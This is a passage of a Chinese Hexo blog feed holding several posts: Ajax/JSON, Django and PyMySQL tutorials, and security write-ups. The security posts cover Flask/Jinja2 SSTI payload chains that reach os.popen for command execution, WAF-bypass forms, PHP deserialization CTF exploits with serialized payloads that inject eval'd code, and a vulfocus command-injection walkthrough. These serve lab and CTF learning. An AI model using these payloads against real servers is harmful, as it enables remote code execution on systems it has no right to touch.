href="https://www.runoob.com/http/http-status-codes.html">https://www.runoob.com/http/http-status-codes.html</a></li></ul></li></ul><h2 id="Ajax-Json"><a href="#Ajax-Json" class="headerlink" title="Ajax - Json"></a>Ajax - Json</h2><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">putJson</span>(<span class="hljs-params"></span>)&#123;</span><span class="language-javascript">        <span class="hljs-keyword">var</span> xmlhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><span class="language-javascript">        xmlhttp.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><span class="language-javascript">        <span class="hljs-keyword">if</span>(xmlhttp.<span class="hljs-property">status</span> == <span class="hljs-number">200</span> &amp;&amp; xmlhttp.<span class="hljs-property">readyState</span> ==<span class="hljs-number">4</span>)&#123;</span><span class="language-javascript">            <span class="hljs-keyword">var</span> myArr = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>);</span><span class="language-javascript">                <span class="hljs-title function_">myFunc</span>(myArr);</span><span class="language-javascript">           &#125;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">        xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;test.json&quot;</span>,<span class="hljs-literal">true</span>);</span><span class="language-javascript">        xmlhttp.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-type&quot;</span>,<span class="hljs-string">&quot;application/json;charset=utf-8&quot;</span>);</span><span class="language-javascript">        xmlhttp.<span class="hljs-title function_">send</span>();</span><span class="language-javascript">    &#125;</span><span class="language-javascript">    <span class="hljs-keyword">function</span> <span class="hljs-title function_">myFunc</span>(<span class="hljs-params">arr</span>)&#123;</span><span class="language-javascript"><span class="hljs-keyword">var</span> out = <span class="hljs-string">&quot;&quot;</span>;</span><span class="language-javascript">        <span class="hljs-keyword">var</span> i;</span><span class="language-javascript">        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;arr.<span class="hljs-property">length</span>;i++)&#123;</span><span class="language-javascript">out += <span class="hljs-string">&#x27;a&lt; href=&quot;&#x27;</span>+arr[i].<span class="hljs-property">url</span>+<span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>+arr[i].<span class="hljs-property">title</span>+<span class="hljs-string">&#x27;&lt;/a&gt;&lt;br&gt;&#x27;</span>;</span><span class="language-javascript">        &#125;</span><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;myDiv&#x27;</span>).<span class="hljs-property">innerHTML</span>=out;</span><span class="language-javascript">    &#125;</span><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><p>test.json</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">[</span>  <span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JavaScript 教程&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.runoob.com/js/&quot;</span>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>  <span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HTML 教程&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.runoob.com/html/&quot;</span>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>  <span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;title&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CSS 教程&quot;</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.runoob.com/css/&quot;</span>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI模板注入漏洞</title>
    <link href="/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="ssti漏洞的成因与危害"><a href="#ssti漏洞的成因与危害" class="headerlink" title="ssti漏洞的成因与危害"></a>ssti漏洞的成因与危害</h1><blockquote><p>当服务端接受了用户的恶意代码，未经任何处理就将其应用在web应用模板的部分上，服务端在渲染这些模板时，执行了这些恶意代码，可能导致getshell 代码执行 敏感信息泄露等安全问题</p></blockquote><p>一个简单的漏洞代码实例</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,render_template_string,requestapp = Flask(__name__)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    name = request.args.get(<span class="hljs-string">&quot;name&quot;</span>)    <span class="hljs-built_in">str</span> = <span class="hljs-string">f&quot;Hello <span class="hljs-subst">&#123;name&#125;</span>&quot;</span>    <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-built_in">str</span>,name=name)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(debug=<span class="hljs-literal">True</span>)</code></pre></div><p>使用 <code>&#123;&#123;1-2&#125;&#125;</code> 测试，发现代码被执行</p><p><img src="/./SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250813160700465.png" alt="image-20250813160700465"></p><p>注意！</p><blockquote><p>这里的运算符号不能是 + 号，因为在url编码中+号做为空格使用</p></blockquote><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="从一个字符串或者列表对象中获取其类"><a href="#从一个字符串或者列表对象中获取其类" class="headerlink" title="从一个字符串或者列表对象中获取其类"></a>从一个字符串或者列表对象中获取其类</h2><div class="code-wrapper"><pre><code class="hljs jinja2">&#x27;&#x27;.__class__</code></pre></div><h3 id="获取基类，使用-这个类"><a href="#获取基类，使用-这个类" class="headerlink" title="获取基类，使用&lt;class ‘object’&gt; 这个类"></a>获取基类，使用&lt;class ‘object’&gt; 这个类</h3> <div class="code-wrapper"><pre><code class="hljs jinja2">&#x27;&#x27;.__class__.__bases__</code></pre></div> <div class="code-wrapper"><pre><code class="hljs jinja2">&#x27;&#x27;.__class__.__mro__</code></pre></div> <div class="code-wrapper"><pre><code class="hljs jinja2">&#x27;&#x27;.__class__.__base__</code></pre></div><p>​    </p><p><img src="/./SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250813163526166.png" alt="image-20250813163526166"></p><p>这里要使用 &lt;class ‘object’&gt;  这个类 可以使用下标表示</p><div class="code-wrapper"><pre><code class="hljs jinja2">&#x27;&#x27;.__class__.__mro__[1]</code></pre></div><h2 id="获取-object-类下面的所有子类"><a href="#获取-object-类下面的所有子类" class="headerlink" title="获取 object 类下面的所有子类"></a>获取 object 类下面的所有子类</h2><div class="code-wrapper"><pre><code class="hljs jinja2">&#x27;&#x27;.__class__.__base__.__subclasses__()</code></pre></div><p> 获取到之后选择合适的类，这里可以使用&lt;class ‘os._wrap_close’&gt;这个类</p><p>比如在列表的第117行，可以这样写</p><div class="code-wrapper"><pre><code class="hljs jinja2">&#x27;&#x27;.__class__.__base__.__subclasses__()[117]</code></pre></div><h2 id="初始化类，获取全局方法，变量以及参数"><a href="#初始化类，获取全局方法，变量以及参数" class="headerlink" title="初始化类，获取全局方法，变量以及参数"></a>初始化类，获取全局方法，变量以及参数</h2><div class="code-wrapper"><pre><code class="hljs jinja2">&#x27;&#x27;.__class__.__base__.__subclasses__()[117].__init__.__globals__</code></pre></div><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>使用 popen()  + read() 方法可以返回执行后的结果</p><div class="code-wrapper"><pre><code class="hljs jinja2">&#x27;&#x27;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()</code></pre></div><h3 id="其他引用"><a href="#其他引用" class="headerlink" title="其他引用"></a>其他引用</h3><div class="code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;urlfor.__class__.__globals__[&#x27;os&#x27;].popen(&#x27;calc&#x27;)&#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;calc&#x27;)&#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;get_flashed_messages.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</code></pre></div><h1 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h1><h2 id="双重花括号拦截绕过"><a href="#双重花括号拦截绕过" class="headerlink" title="双重花括号拦截绕过"></a>双重花括号拦截绕过</h2><div class="code-wrapper"><pre><code class="hljs jinja2">&#123;%print(&#x27;&#x27;.__class__)%&#125;</code></pre></div><h2 id="request方法绕过"><a href="#request方法绕过" class="headerlink" title="request方法绕过"></a>request方法绕过</h2><div class="code-wrapper"><pre><code class="hljs python">request.args.key  <span class="hljs-comment">#获取get传入的key的值</span>request.form.key  <span class="hljs-comment">#获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span>reguest.values.key  <span class="hljs-comment">#获取所有参数，如果get和post有同一个参数，post的参数会覆盖get</span>request.cookies.key  <span class="hljs-comment">#获取cookies传入参数</span>request.headers.key  <span class="hljs-comment">#获取请求头请求参数</span>request.data  <span class="hljs-comment">#获取post传入参数(Content-Type:a/b)</span>request.json  <span class="hljs-comment">#获取post传入json参数 (Content-Type: application/json)</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssti</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码审计-反序列化漏洞</title>
    <link href="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<blockquote><p>所有的 flag 均在 flag.php 的 $flag 变量中</p></blockquote><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;act);    &#125;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">action</span>();<span class="hljs-meta">?&gt;</span></code></pre></div><p>eval函数为代码执行函数，将字符串作为php代码执行，已知 flag 在 flag.php 文件中，先将 flag.php 文件包含进来，再对 flag 变量进行输出</p><p>exp:</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;act);    &#125;&#125;<span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> a;<span class="hljs-variable">$test</span>-&gt;act = <span class="hljs-string">&#x27;include(&quot;flag.php&quot;);echo $flag;&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>)</code></pre></div><p>生成的payload：</p><blockquote><p>O:1:”a”:1:{s:3:”act”;s:31:”include(“flag.php”);echo $flag;”;}</p></blockquote><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mylogin</span></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;        <span class="hljs-variable language_">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&quot;daydream&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&quot;ok&quot;</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;        &#125;    &#125;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">login</span>())&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>login 方法中校验 user 和 pass 的值，如果返回结果为真，则输出 $flag</p><p>__construct 初始化方法</p><p>exp:</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mylogin</span></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;        <span class="hljs-variable language_">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&quot;daydream&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&quot;ok&quot;</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;        &#125;    &#125;&#125;<span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mylogin</span>(<span class="hljs-string">&quot;daydream&quot;</span>,<span class="hljs-string">&quot;ok&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>payload:</p><blockquote><p>O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p></blockquote><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mylogin</span></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;        <span class="hljs-variable language_">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&quot;daydream&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&quot;ok&quot;</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;        &#125;    &#125;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">login</span>())&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>与 level 2 相似 注意 超全局变量 $_COOKIE ，通过cookie 传参传入 payload ，同时进行一下url编码</p><p>payload：</p><blockquote><p>O%3a7%3a%22mylogin%22%3a2%3a%7bs%3a4%3a%22user%22%3bs%3a8%3a%22daydream%22%3bs%3a4%3a%22pass%22%3bs%3a2%3a%22ok%22%3b%7d</p></blockquote><p>未完待续。。。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>php</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulfocus|命令执行漏洞WP</title>
    <link href="/vulfocus-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9EWP/"/>
    <url>/vulfocus-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9EWP/</url>
    
    <content type="html"><![CDATA[<h1 id="1-运行环境"><a href="#1-运行环境" class="headerlink" title="1.运行环境"></a>1.运行环境</h1><p>进入首页 返回 index.php?cmd&#x3D;ls &#x2F;tmp</p><h1 id="2-将其拼接到浏览器-url-栏后面"><a href="#2-将其拼接到浏览器-url-栏后面" class="headerlink" title="2.将其拼接到浏览器 url 栏后面"></a>2.将其拼接到浏览器 url 栏后面</h1><p>发现输出了一段文字，但是看的不是很明显，CTRL+U 查看页面源代码</p><p>发现有两行东西，这就说明这个目录下面就一个index.php 文件</p><p>推测执行了 ls 系统命令</p><h1 id="3-替换其他指令查找-flag"><a href="#3-替换其他指令查找-flag" class="headerlink" title="3.替换其他指令查找 flag"></a>3.替换其他指令查找 flag</h1><p>执行下列命令</p><div class="code-wrapper"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;*flag*&#x27;</span></code></pre></div><p>获得flag</p><p>flag-{bmh8bd27630-a4fd-4bfa-a7c8-61af1a1f0f0b}</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python-Django开发</title>
    <link href="/Python-Django%E5%BC%80%E5%8F%91/"/>
    <url>/Python-Django%E5%BC%80%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h1 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h1><ul><li>创建 env 环境</li></ul><div class="code-wrapper"><pre><code class="hljs bash">python -m venv <span class="hljs-built_in">env</span></code></pre></div><ul><li>启动虚拟环境</li></ul><div class="code-wrapper"><pre><code class="hljs bash">./env/Scripts/activate</code></pre></div><h1 id="运行第一个-Django-程序"><a href="#运行第一个-Django-程序" class="headerlink" title="运行第一个 Django 程序"></a>运行第一个 Django 程序</h1><ul><li>安装 django 库</li></ul><div class="code-wrapper"><pre><code class="hljs bash">pip install django</code></pre></div><ul><li>初始化 django 项目</li></ul><div class="code-wrapper"><pre><code class="hljs bash">django-admin startproject website</code></pre></div><ul><li>启动 django 项目</li></ul><div class="code-wrapper"><pre><code class="hljs bash">python ./website/manage.py runserver</code></pre></div><ul><li>切换端口号</li></ul><div class="code-wrapper"><pre><code class="hljs bash">python manage.py runserver 8888</code></pre></div><h2 id="修改首页并输出-Hello-world"><a href="#修改首页并输出-Hello-world" class="headerlink" title="修改首页并输出 Hello world"></a>修改首页并输出 Hello world</h2><ul><li>在根目录下新建 views.py</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># views.py</span><span class="hljs-keyword">from</span> django.http <span class="hljs-keyword">import</span> HttpResponse<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request</span>):  <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;Hello world&quot;</span>)</code></pre></div><ul><li>修改 urls.py 文件</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#urls.py</span><span class="hljs-keyword">from</span> django.contrib <span class="hljs-keyword">import</span> admin<span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> path<span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> views   <span class="hljs-comment">#导入 views.py </span>urlpatterns = [    path(<span class="hljs-string">&#x27;admin/&#x27;</span>, admin.site.urls),    path(<span class="hljs-string">&#x27;&#x27;</span>,views.index,name=<span class="hljs-string">&quot;asd&quot;</span>), ]</code></pre></div><h1 id="django-admin-命令详解"><a href="#django-admin-命令详解" class="headerlink" title="django-admin 命令详解"></a>django-admin 命令详解</h1><ul><li>查看 django-admin 提供的所有命令</li></ul><div class="code-wrapper"><pre><code class="hljs bash">django-admin <span class="hljs-built_in">help</span></code></pre></div><h2 id="创建新项目"><a href="#创建新项目" class="headerlink" title="创建新项目"></a>创建新项目</h2><div class="code-wrapper"><pre><code class="hljs bash">django-admin startproject</code></pre></div><p>在当前目录下创建一个新的django项目，包括最基本的目录</p><ul><li>项目名称 &#x2F;: 项目主目录<ul><li>__init__ .py</li><li>settings.py 配置文件</li><li>urls.py : URL路由配置</li><li>wsgi.py ：WSGI 应用入口</li></ul></li></ul><h2 id="创建新应用"><a href="#创建新应用" class="headerlink" title="创建新应用"></a>创建新应用</h2><div class="code-wrapper"><pre><code class="hljs pyhon">django-admin startapp 应用名称</code></pre></div><p>创建一个新的 django 应用，包含：</p><ul><li>migrations&#x2F;：数据库迁移文件目录</li><li><em>_init</em>_.py</li><li>admin.py：管理后台配置</li><li>apps.py：应用配置</li><li>models.py：数据库模型定义</li><li>tests.py：测试代码</li><li>views.py：试图函数</li></ul><h2 id="检查项目配置"><a href="#检查项目配置" class="headerlink" title="检查项目配置"></a>检查项目配置</h2><div class="code-wrapper"><pre><code class="hljs bash">django-admin check</code></pre></div><p>这个命令会检查 django 项目是否有配置错误，包括：</p><ul><li>模型定义是否正确</li><li>url 配置是否有效</li><li>模板设置是否正确</li><li>静态文件配置等</li></ul><h2 id="数据库迁移"><a href="#数据库迁移" class="headerlink" title="数据库迁移"></a>数据库迁移</h2><p>django 使用迁移系统来管理数据库模式变更</p><div class="code-wrapper"><pre><code class="hljs bash">django-admin makemigrations <span class="hljs-comment"># 创建迁移文件</span>django-admin migrate        <span class="hljs-comment"># 应用迁移到数据库</span></code></pre></div><h2 id="创建超级用户"><a href="#创建超级用户" class="headerlink" title="创建超级用户"></a>创建超级用户</h2><blockquote><p>引导用户创建一个可以访问django 管理后台的超级用户</p></blockquote><div class="code-wrapper"><pre><code class="hljs bash">django-admin createsuperuser</code></pre></div><h1 id="django-admin-常用命令"><a href="#django-admin-常用命令" class="headerlink" title="django-admin 常用命令"></a>django-admin 常用命令</h1><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>startproject</td><td>创建一个新的django项目</td></tr><tr><td>startapp</td><td>创建一个新的django应用</td></tr><tr><td>runserver</td><td>启动开发服务器</td></tr><tr><td>makemigrations</td><td>生成数据库迁移文件</td></tr><tr><td>migrate</td><td>执行数据库迁移</td></tr><tr><td>shell</td><td>启动 django 交互式shell</td></tr><tr><td>collectstatic</td><td>收集静态文件（用于生产环境）</td></tr><tr><td>test</td><td>运行单元测试</td></tr><tr><td></td><td></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Django</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python创建env虚拟环境</title>
    <link href="/Python%E5%88%9B%E5%BB%BAenv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"/>
    <url>/Python%E5%88%9B%E5%BB%BAenv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h1 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h1><div class="code-wrapper"><pre><code class="hljs bash">python -m venv <span class="hljs-built_in">env</span></code></pre></div><h1 id="启动虚拟环境"><a href="#启动虚拟环境" class="headerlink" title="启动虚拟环境"></a>启动虚拟环境</h1><div class="code-wrapper"><pre><code class="hljs python">./env/scripts/activate</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python-PyMySQL</title>
    <link href="/Python-PyMySQL/"/>
    <url>/Python-PyMySQL/</url>
    
    <content type="html"><![CDATA[<h1 id="安装-PyMySQL"><a href="#安装-PyMySQL" class="headerlink" title="安装 PyMySQL"></a>安装 PyMySQL</h1><div class="code-wrapper"><pre><code class="hljs bash">pip install PyMySQL</code></pre></div><h1 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h1><blockquote><p>开启 mysql 地址为 localhost:3306 用户名为 root 密码为 root</p></blockquote><ul><li>创建数据库连接</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysqldbconn = pymysql.connect(  host=<span class="hljs-string">&#x27;localhost&#x27;</span>,  user=<span class="hljs-string">&#x27;root&#x27;</span>,  password=<span class="hljs-string">&#x27;root&#x27;</span>,  database=<span class="hljs-string">&#x27;test&#x27;</span>)</code></pre></div><ul><li>使用 cursor() 方法创建一个游标对象 cursor</li></ul><div class="code-wrapper"><pre><code class="hljs python">cursor = dbconn.cursor()</code></pre></div><ul><li>使用 excute() 方法执行sql查询</li></ul><div class="code-wrapper"><pre><code class="hljs python">cursor.excute(<span class="hljs-string">&quot;select user()&quot;</span>)</code></pre></div><ul><li>使用 fetchone() 方法获取一条数据</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = cursor.fetchone()</code></pre></div><ul><li>关闭数据库连接</li></ul><div class="code-wrapper"><pre><code class="hljs python">dbconn.close()</code></pre></div><ul><li>创建数据表</li></ul><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span> <span class="hljs-keyword">import</span> pymysql <span class="hljs-comment"># 打开数据库连接</span>db = 